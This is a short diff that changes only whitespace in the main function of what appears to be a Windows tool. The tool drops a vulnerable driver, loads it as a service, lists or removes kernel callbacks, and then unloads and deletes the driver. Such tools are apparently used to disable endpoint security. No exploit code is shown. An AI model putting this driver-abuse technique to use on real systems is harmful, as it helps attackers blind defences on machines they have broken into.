@@ -69,7 +69,7 @@ int main(int argc, char** argv) {
 	}
 	okayW(L"WriteDriverToFile - Written vulnerable driver to \"%s\"", szVulnDriverPath);
 	printf("\n");
-	
+
 	// Load the vulnerable driver as a service
 	infoW(L"LoadDriver - Loading vulnerable driver from \"%s\" with name \"%s\"", szVulnDriverPath, g_VULNDRIVERNAME);
 	if (!LoadDriver(g_VULNDRIVERNAME, szVulnDriverPath)) {
@@ -98,7 +98,7 @@ int main(int argc, char** argv) {
 		}
 	}
 	okay("ListOrRemoveKernelCallbacks - Completed");
-	
+
 
 _cleanUp:
 
@@ -112,7 +112,7 @@ _cleanUp:
 	}
 	okayW("UnloadDriver - Unloaded vulnerable driver \"%s\"", g_VULNDRIVERNAME);
 	printf("\n");
-	
+
 	// Remove vulnerable driver from filesystem
 	infoW(L"RemoveFileW - Vulnerable driver \"%s\"", szVulnDriverPath);
 	if (!RemoveFileW(szVulnDriverPath)) {
